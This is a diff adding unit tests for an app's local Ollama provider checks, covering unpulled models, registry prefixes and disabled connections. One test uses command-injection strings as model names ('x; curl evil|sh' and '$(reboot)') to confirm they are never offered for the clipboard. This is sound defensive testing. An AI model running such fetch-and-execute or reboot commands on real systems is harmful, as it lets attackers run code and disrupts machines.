@@ -29,6 +29,26 @@ describe("Model not pulled (local Ollama)", () => {
     expect(missingProviderAction([ollama()], "ollama-local")).toEqual({ text: "Pull qwen3:8b to send", id: "ollama-local" });
   });
 
+  it("a fresh Ollama with nothing pulled (empty list) is flagged, not read as ready", () => {
+    expect(modelNotPulled(ollama({ models: [] }))).toBe("qwen3:8b");
+  });
+
+  it("a registry host:port prefix is not mistaken for a tag", () => {
+    const c = ollama({ defaultModel: "localhost:5000/team/model", models: [{ id: "localhost:5000/team/model:latest", ctx: 0 }] });
+    expect(modelNotPulled(c)).toBeNull();
+  });
+
+  it("an id that is not a model name is never offered for the clipboard", () => {
+    expect(modelNotPulled(ollama({ defaultModel: "x; curl evil|sh" }))).toBeNull();
+    expect(modelNotPulled(ollama({ defaultModel: "$(reboot)" }))).toBeNull();
+  });
+
+  it("a turned-off connection still asks for the switch first, in the composer too", () => {
+    const off = ollama({ enabled: false });
+    expect(providerReadiness(off).missing).toBe("turn-on");
+    expect(missingProviderAction([off], "ollama-local")?.text).toBe("Turn on Ollama local to send");
+  });
+
   it.each([
     ["a pulled model", { defaultModel: "gemma4:26b" }],
     ["an untagged name that matches :latest", { defaultModel: "llama3.2" }],
